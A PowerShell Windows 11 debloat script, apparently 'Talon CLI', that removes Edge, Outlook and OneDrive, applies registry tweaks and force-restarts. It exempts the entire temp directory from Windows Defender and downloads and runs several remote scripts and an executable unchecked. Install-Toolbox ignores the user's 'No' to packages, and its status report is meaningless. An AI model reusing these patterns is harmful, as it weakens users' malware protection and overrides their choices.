Clear-Host

# Keep window always on top
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Window {
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
}
"@

$HWND_TOPMOST = New-Object -TypeName System.IntPtr -ArgumentList (-1)
$currentWindow = (Get-Process -Id $pid).MainWindowHandle
[Window]::SetWindowPos($currentWindow, $HWND_TOPMOST, 0, 0, 0, 0, 0x0003)

Write-Host @"
WARNING: This script is not affiliated with Raven Development Team. This is a personal project by me (mre31).
                                                                                            
"@ -ForegroundColor Yellow

Write-Host @"
 _____  _    _     ___  _   _    ___ _    ___ 
|_   _|/ \  | |   / _ \| \ | |  / __| |  |_ _|
  | | / _ \ | |  | | | |  \| | | (__| |__ | | 
  | |/ ___ \| |__| |_| | |\  |  \___|____|___|
  |_/_/   \_\_____\___/|_| \_|   Made by Mre31
"@ -ForegroundColor Cyan

# Set ExecutionPolicy to Bypass for this session
Set-ExecutionPolicy Bypass -Scope Process -Force

# Log function
function Write-Log {
    param([string]$Message)
    Write-Host "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'): $Message"
}

function Get-UserChoices {
    $choices = @{}
    
    Write-Host @"

[WARNING]
DO NOT TOUCH ANYTHING WHILE IT'S RUNNING!
IT WILL INTERRUPT THE PROCESS AND MAY CAUSE CORRUPTION! IT MAY LOOK FROZEN BUT IT'S NOT.
IF YOU ARE %100 SURE THAT ITS FROZEN YOU CAN FORCE CLOSE IT.

Do you accept? (Y/N)
"@ -ForegroundColor Red
    
    $acceptChoice = Read-Host
    if ($acceptChoice -ne 'Y' -and $acceptChoice -ne 'y') {
        Write-Host "Installation cancelled by user." -ForegroundColor Yellow
        Exit
    }
    
    # Browser selection
    Write-Host "`nAvailable browsers:"
    $browserChoices = [ordered]@{
        1 = @{ Name = "Chrome"; Id = "Google.Chrome" }
        2 = @{ Name = "Brave"; Id = "Brave.Brave" }
        3 = @{ Name = "Firefox (recommended)"; Id = "Mozilla.Firefox" }
        4 = @{ Name = "Librewolf"; Id = "Librewolf.Librewolf" }
    }
    
    # Sıralı gösterim için
    1..4 | ForEach-Object {
        if ($browserChoices.Contains($_)) {
            Write-Host "$($_)) $($browserChoices[$_].Name)"
        }
    }
    
    do {
        $browserChoice = Read-Host "`nSelect a browser to install (1-4) [Required]"
        $browserNum = 0
        
        if ([string]::IsNullOrWhiteSpace($browserChoice)) {
            Write-Host "Browser selection is required. Please choose a browser."
            continue
        }
        
        if (![int]::TryParse($browserChoice, [ref]$browserNum) -or $browserNum -lt 1 -or $browserNum -gt 4) {
            Write-Host "Invalid selection. Please enter a number between 1 and 4."
            continue
        }
        
        $choices.Browser = $browserChoices[$browserNum]
        
    } while ($null -eq $choices.Browser)
    
    # Toolbox selections
    Write-Host "`nRaven Software Package"
    $packagesData = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/ravendevteam/toolbox/refs/heads/main/packages.json"
    
    $packageChoice = Read-Host "Do you want to install all Raven software? (Y/N)"
    if ($packageChoice -eq 'Y' -or $packageChoice -eq 'y') {
        $choices.Packages = $packagesData.packages
        Write-Host "All Raven software will be installed."
    }
    else {
        $choices.Packages = @()
        Write-Host "Skipping Raven software installation."
    }
    
    return $choices
}

# Check for administrator rights
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Log "This script must be run with administrator rights!"
    Exit 1
}

# Get user choices at the very beginning
Write-Host "`n=== ButtFuckMicrosoft Configuration ==="
Write-Host "Please make your selections for the installation process."

$userChoices = Get-UserChoices

Write-Host "`nStarting installation with selected options..."
Write-Host "This process will run automatically from now on."
Write-Host "Your system will restart when completed.`n"

function Set-DefenderExclusions {
    Write-Log "Setting up Windows Defender exclusions..."
    
    try {
        # Create Raven Software directory
        $installPath = Join-Path $env:APPDATA "ravendevteam"
        if (!(Test-Path $installPath)) {
            New-Item -Path $installPath -ItemType Directory -Force | Out-Null
            Write-Log "Created installation directory: $installPath"
        }
        
        # Add directory to Defender exclusions
        Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
        Write-Log "Added Windows Defender exclusion for: $installPath"
        
        # Add temp directory to exclusions for script downloads
        $tempPath = [System.IO.Path]::GetTempPath()
        Add-MpPreference -ExclusionPath $tempPath -ErrorAction SilentlyContinue
        Write-Log "Added Windows Defender exclusion for: $tempPath"
        
        return $true
    }
    catch {
        Write-Log "Error setting up Windows Defender exclusions: $_"
        return $false
    }
}

function Invoke-ExternalScript {
    param(
        [string]$Command,
        [string]$Description
    )
    
    Write-Log "Starting $Description..."
    try {
        # Create a temporary file for the script output
        $outputFile = Join-Path $env:TEMP "script_output_$(Get-Random).txt"
        
        # Start the process with output redirection
        $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processStartInfo.FileName = "powershell.exe"
        $processStartInfo.Arguments = "-NoProfile -NonInteractive -Command `"$($Command -replace '"', '`"') 2>&1 | Tee-Object -FilePath '$outputFile'`""
        $processStartInfo.UseShellExecute = $false
        $processStartInfo.RedirectStandardOutput = $true
        $processStartInfo.RedirectStandardError = $true
        $processStartInfo.WindowStyle = 'Hidden'
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processStartInfo
        
        # Start the process and wait for it to complete
        $process.Start() | Out-Null
        $process.WaitForExit()
        
        # Read and log the output
        if (Test-Path $outputFile) {
            Get-Content $outputFile | ForEach-Object { Write-Log $_ }
            Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
        }
        
        if ($process.ExitCode -eq 0) {
            Write-Log "$Description completed successfully."
            $global:LASTEXITCODE = 0
            return $true
        }
        else {
            Write-Log "$Description completed with exit code: $($process.ExitCode)"
            $global:LASTEXITCODE = $process.ExitCode
            return $false
        }
    }
    catch {
        Write-Log "Error during $($Description): $_"
        $global:LASTEXITCODE = 1
        return $false
    }
}

# Spinner fonksiyonu ekleyelim
function Show-Spinner {
    param(
        [string]$Message
    )
    
    $spinChars = "-", "\", "|", "/"
    $i = 0
    
    Write-Host "`r$($spinChars[$i]) $Message" -NoNewline
    
    $Script:ShowSpinner = $true
    
    # Spinner'ı ayrı bir job'da çalıştır
    $job = Start-Job -ScriptBlock {
        param($spinChars, $message)
        $i = 0
        while ($true) {
            Write-Host "`r$($spinChars[$i]) $message" -NoNewline
            Start-Sleep -Milliseconds 100
            $i = ($i + 1) % $spinChars.Length
        }
    } -ArgumentList $spinChars, $Message
    
    return $job
}

function Stop-Spinner {
    param(
        $Job
    )
    
    if ($Job) {
        Stop-Job -Job $Job
        Remove-Job -Job $Job
        Write-Host "`r" -NoNewline
    }
}

function Remove-Edge {
    Write-Log "Starting Edge removal process..."
    
    $spinnerJob = Show-Spinner "Removing Microsoft Edge..."
    
    $scriptUrl = "https://raw.githubusercontent.com/ravendevteam/talon-blockedge/refs/heads/main/edge_vanisher.ps1"
    $tempPath = [System.IO.Path]::GetTempPath()
    $scriptPath = Join-Path $tempPath "edge_vanisher.ps1"
    
    try {
        # Download script
        Write-Log "Downloading Edge Vanisher by mre31 script..."
        $response = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing
        
        if ($response.StatusCode -eq 200) {
            Set-Content -Path $scriptPath -Value $response.Content
            
            if (Test-Path $scriptPath) {
                Write-Log "Script downloaded successfully. File size: $((Get-Item $scriptPath).Length) bytes"
                
                # Execute script
                $command = "Set-ExecutionPolicy Bypass -Scope Process -Force; & '$scriptPath'; exit"
                Invoke-ExternalScript -Command $command -Description "Edge removal"
            }
            else {
                throw "Script file not found after download"
            }
        }
        else {
            throw "Failed to download script: Status code $($response.StatusCode)"
        }
    }
    catch {
        Write-Log "Error during Edge removal process: $_"
    }
    finally {
        Stop-Spinner $spinnerJob
    }
}

function Remove-OutlookAndOneDrive {
    Write-Log "Starting Outlook and OneDrive removal process..."
    
    $scriptUrl = "https://raw.githubusercontent.com/ravendevteam/oouninstaller/refs/heads/main/uninstall_oo.ps1"
    $tempPath = [System.IO.Path]::GetTempPath()
    $scriptPath = Join-Path $tempPath "uninstall_oo.ps1"
    
    try {
        # Download script
        Write-Log "Downloading uninstall script..."
        $response = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing
        
        if ($response.StatusCode -eq 200) {
            Set-Content -Path $scriptPath -Value $response.Content
            
            if (Test-Path $scriptPath) {
                Write-Log "Script downloaded successfully. File size: $((Get-Item $scriptPath).Length) bytes"
                
                # Execute script
                $command = "Set-ExecutionPolicy Bypass -Scope Process -Force; & '$scriptPath'"
                Invoke-ExternalScript -Command $command -Description "Outlook and OneDrive removal"
            }
            else {
                throw "Script file not found after download"
            }
        }
        else {
            throw "Failed to download script: Status code $($response.StatusCode)"
        }
    }
    catch {
        Write-Log "Error during removal process: $_"
    }
}

function Set-CustomRegistry {
    Write-Log "Applying registry changes..."
    
    $registryModifications = @(
        # Visual changes
        @{
            Path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
            Name = "TaskbarAl"
            Value = 0  # Align taskbar to the left
            Type = "DWord"
        },
        @{
            Path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize"
            Name = "AppsUseLightTheme"
            Value = 0  # Set Windows to dark theme
            Type = "DWord"
        },
        @{
            Path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize"
            Name = "SystemUsesLightTheme"
            Value = 0  # Set Windows to dark theme
            Type = "DWord"
        },
        @{
            Path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\GameDVR"
            Name = "AppCaptureEnabled"
            Value = 0  # Fix the Get an app for 'ms-gamingoverlay' popup
            Type = "DWord"
        }
    )

    foreach ($mod in $registryModifications) {
        try {
            # Make sure registry path exists
            if (!(Test-Path $mod.Path)) {
                New-Item -Path $mod.Path -Force | Out-Null
            }

            # Set registry value
            Set-ItemProperty -Path $mod.Path -Name $mod.Name -Value $mod.Value -Type $mod.Type -ErrorAction Stop
            Write-Log "Successfully applied: $($mod.Name) -> $($mod.Path)"
        }
        catch {
            Write-Log "Error: Failed to modify $($mod.Path)\$($mod.Name): $_"
        }
    }

    Write-Log "Registry changes applied successfully."
    
    # Restart Explorer
    Write-Log "Restarting Explorer..."
    Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
    Start-Process "explorer.exe"
    Write-Log "Explorer restarted."
}

function Set-CTTTweaks {
    Write-Log "Starting CTT Windows Utility tweaks..."
    
    $config = @{
        "WPFTweaks" = @(
            "WPFTweaksRestorePoint",
            "WPFTweaksWifi",
            "WPFTweaksHome",
            "WPFTweaksRemoveEdge",
            "WPFTweaksRemoveHomeGallery",
            "WPFTweaksDisableLMS1",
            "WPFTweaksIPv46",
            "WPFTweaksDeBloat",
            "WPFTweaksConsumerFeatures",
            "WPFTweaksDisplay",
            "WPFTweaksAH",
            "WPFTweaksRightClickMenu",
            "WPFTweaksRemoveCopilot",
            "WPFTweaksLoc",
            "WPFTweaksRemoveOnedrive",
            "WPFTweaksServices",
            "WPFTweaksDeleteTempFiles",
            "WPFTweaksRecallOff",
            "WPFTweaksDisableBGapps",
            "WPFTweaksTele"
        )
        "WPFFeature" = @(
            "WPFFeaturesSandbox",
            "WPFFeatureshyperv"
        )
    }

    $tempPath = [System.IO.Path]::GetTempPath()
    $configPath = Join-Path $tempPath "custom_config.json"
    $scriptPath = Join-Path $tempPath "ctt.ps1"
    
    try {
        # Save config
        $config | ConvertTo-Json | Set-Content -Path $configPath -Encoding UTF8
        
        # Download and save script
        Write-Log "Downloading CTT Windows Utility script..."
        $scriptContent = Invoke-RestMethod -Uri "https://christitus.com/win"
        Set-Content -Path $scriptPath -Value $scriptContent
        
        # Execute script
        Write-Log "Executing CTT Windows Utility..."
        $process = Start-Process powershell -ArgumentList "-NoProfile", "-NonInteractive", "-Command", "& '$scriptPath' -Config '$configPath' -Run -Silent" -PassThru -RedirectStandardOutput "stdout.txt" -RedirectStandardError "stderr.txt"
        
        # Monitor output for completion
        while (!$process.HasExited) {
            if (Test-Path "stdout.txt") {
                $content = Get-Content "stdout.txt" -Raw
                if ($content -match "Tweaks are Finished") {
                    Write-Log "CTT Windows Utility completed successfully."
                    $process | Stop-Process -Force
                    break
                }
            }
            Start-Sleep -Milliseconds 100
        }
        
        # Log the output
        if (Test-Path "stdout.txt") {
            Get-Content "stdout.txt" | ForEach-Object { Write-Log "CTT: $_" }
            Remove-Item "stdout.txt" -Force
        }
        if (Test-Path "stderr.txt") {
            Get-Content "stderr.txt" | ForEach-Object { Write-Log "CTT Error: $_" }
            Remove-Item "stderr.txt" -Force
        }
    }
    catch {
        Write-Log "Error during CTT Windows Utility execution: $_"
    }
}

function Set-Win11Debloat {
    Write-Log "Starting Win11Debloat process..."
    
    $scriptUrl = "https://win11debloat.raphi.re/"
    $tempPath = [System.IO.Path]::GetTempPath()
    $scriptPath = Join-Path $tempPath "Win11Debloat.ps1"
    
    try {
        # Download script
        Write-Log "Downloading Win11Debloat script..."
        Invoke-RestMethod -Uri $scriptUrl -OutFile $scriptPath
        
        # Execute script with parameters
        $command = "& '$scriptPath' -Silent -RemoveApps -RemoveGamingApps -DisableTelemetry -DisableBing -DisableSuggestions -DisableLockscreenTips -RevertContextMenu -TaskbarAlignLeft -HideSearchTb -DisableWidgets -DisableCopilot -ExplorerToThisPC"
        Invoke-ExternalScript -Command $command -Description "Win11Debloat"
    }
    catch {
        Write-Log "Error during Win11Debloat process: $_"
    }
}

function Set-UpdatePolicy {
    Write-Log "Starting UpdatePolicyChanger process..."
    
    $scriptUrl = "https://raw.githubusercontent.com/mre31/NovaWindowsCleanUp/refs/heads/main/SecurityOnly.ps1"
    $tempPath = [System.IO.Path]::GetTempPath()
    $scriptPath = Join-Path $tempPath "UpdatePolicyChanger.ps1"
    
    try {
        # Download script
        Write-Log "Downloading UpdatePolicyChanger script..."
        $response = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing
        
        if ($response.StatusCode -eq 200) {
            Set-Content -Path $scriptPath -Value $response.Content
            
            if (Test-Path $scriptPath) {
                Write-Log "Script downloaded successfully. File size: $((Get-Item $scriptPath).Length) bytes"
                
                # Execute script with bypass and show output
                $command = "Set-ExecutionPolicy Bypass -Scope Process -Force; & '$scriptPath' | Tee-Object -Variable output; Write-Output `$output; exit"
                Invoke-ExternalScript -Command $command -Description "UpdatePolicyChanger"
                
                # Display the output directly
                if ($output) {
                    Write-Host "`nUpdatePolicyChanger Output:" -ForegroundColor Cyan
                    $output | ForEach-Object { Write-Host $_ }
                }
            }
            else {
                throw "Script file not found after download"
            }
        }
        else {
            throw "Failed to download script: Status code $($response.StatusCode)"
        }
    }
    catch {
        Write-Log "Error during UpdatePolicyChanger process: $_"
    }
}

function Set-Background {
    Write-Log "Starting ApplyBackground process..."
    
    $exeName = "applybackground.exe"
    $tempPath = [System.IO.Path]::GetTempPath()
    $exePath = Join-Path $tempPath $exeName
    $url = "https://github.com/ravendevteam/talon-applybackground/releases/download/v1.0.0/applybackground.exe"
    
    try {
        # Download executable
        Write-Log "Downloading ApplyBackground..."
        $maxAttempts = 3
        $attempt = 1
        $downloadSuccess = $false
        
        while ($attempt -le $maxAttempts -and -not $downloadSuccess) {
            try {
                Write-Log "Download attempt $attempt of $maxAttempts..."
                Invoke-WebRequest -Uri $url -OutFile $exePath
                if (Test-Path $exePath) {
                    $downloadSuccess = $true
                    Write-Log "Download successful"
                }
            }
            catch {
                Write-Log "Download attempt $attempt failed: $_"
                Start-Sleep -Seconds 3
            }
            $attempt++
        }
        
        if (-not $downloadSuccess) {
            throw "Failed to download ApplyBackground after $maxAttempts attempts"
        }
        
        # Execute ApplyBackground
        Write-Log "Executing ApplyBackground..."
        & $exePath
        
        Write-Log "ApplyBackground completed successfully."
    }
    catch {
        Write-Log "Error during ApplyBackground process: $_"
    }
}

# Modify Install-SelectedBrowser to use saved choice
function Install-SelectedBrowser {
    param($BrowserChoice)
    
    if ($null -ne $BrowserChoice) {
        Write-Log "Installing $($BrowserChoice.Name)..."
        try {
            & winget install $BrowserChoice.Id --silent --accept-package-agreements --accept-source-agreements
            Write-Log "$($BrowserChoice.Name) installed successfully."
        }
        catch {
            Write-Log "Error installing $($BrowserChoice.Name): $_"
        }
    }
    else {
        Write-Log "No browser selected for installation."
    }
}

# Modify Install-Toolbox to use saved choices
function Install-Toolbox {
    param($SelectedPackages)
    
    Write-Log "Starting Raven Software installation..."
    $installPath = Join-Path $env:APPDATA "ravendevteam"
    
    try {
        # Create installation directory
        if (!(Test-Path $installPath)) {
            New-Item -Path $installPath -ItemType Directory -Force | Out-Null
        }
        
        # Add Windows Defender exclusion
        Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
        Write-Log "Added Windows Defender exclusion for: $installPath"
        
        # Get packages list
        Write-Log "Fetching package list..."
        $packagesData = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/ravendevteam/toolbox/refs/heads/main/packages.json"
        
        $success = $true
        foreach ($package in $packagesData.packages) {
            $packageDir = Join-Path $installPath $package.name
            if (!(Test-Path $packageDir)) {
                New-Item -Path $packageDir -ItemType Directory -Force | Out-Null
            }
            
            $url = $package.url.Windows
            $fileName = Split-Path $url -Leaf
            $downloadPath = Join-Path $packageDir $fileName
            
            Write-Log "Installing $($package.name) v$($package.version)..."
            
            try {
                # Download with progress bar
                $webClient = New-Object System.Net.WebClient
                $webClient.DownloadFile($url, $downloadPath)
                
                if ($package.shortcut) {
                    $desktopPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")
                    $shortcutPath = Join-Path $desktopPath "$($package.name).lnk"
                    cmd /c mklink "$shortcutPath" "$downloadPath"
                    Write-Log "Created shortcut for $($package.name)"
                }
                
                Write-Log "Successfully installed $($package.name)"
            }
            catch {
                $success = $false
                Write-Log "Failed to install $($package.name): $_"
            }
        }
        
        if ($success) {
            Write-Log "All Raven Software installed successfully."
        }
        else {
            Write-Log "Some packages failed to install."
        }
    }
    catch {
        Write-Log "Error during Raven Software installation: $_"
    }
}

function Restart-SystemNow {
    Write-Log "Installation complete. System will restart in 5 seconds..."
    Start-Sleep -Seconds 5
    try {
        Restart-Computer -Force
    }
    catch {
        Write-Log "Error during restart: $_"
        shutdown /r /t 0
    }
}

function Write-Report {
    $reportPath = Join-Path $env:USERPROFILE "Desktop\report.txt"
    $date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    $report = @"
=== ButtFuckMicrosoft Installation Report ===
Date: $date

1. Edge Removal: $(if ($?) {"[OK] Completed"} else {"[X] Failed"})
2. Outlook & OneDrive Removal: $(if ($?) {"[OK] Completed"} else {"[X] Failed"})
3. Registry Customization: $(if ($?) {"[OK] Completed"} else {"[X] Failed"})
4. CTT Windows Utility: $(if ($?) {"[OK] Completed"} else {"[X] Failed"})
5. Win11 Debloat by Raphire: $(if ($?) {"[OK] Completed"} else {"[X] Failed"})
6. Update Policy Changes: $(if ($?) {"[OK] Completed"} else {"[X] Failed"})
7. Background Applied: $(if ($?) {"[OK] Completed"} else {"[X] Failed"})
8. Raven Software Installation: $(if ($userChoices.Packages.Count -gt 0) {"[OK] Installed"} else {"[-] Skipped"})
9. Browser Installation: $($userChoices.Browser.Name) $(if ($?) {"[OK] Installed"} else {"[X] Failed"})

Note: System will restart automatically after installation.
"@

    $report | Out-File -FilePath $reportPath -Encoding UTF8
    Write-Log "Installation report saved to: $reportPath"
}

# Run the script
Write-Log "Starting ButtFuckMicrosoft operations..."
Set-DefenderExclusions
Remove-Edge
Remove-OutlookAndOneDrive
Set-CustomRegistry
Set-CTTTweaks
Set-Win11Debloat
Set-UpdatePolicy
Set-Background
Install-Toolbox -SelectedPackages $userChoices.Packages
Install-SelectedBrowser -BrowserChoice $userChoices.Browser
Write-Log "All operations completed successfully."
Write-Report
Restart-SystemNow 
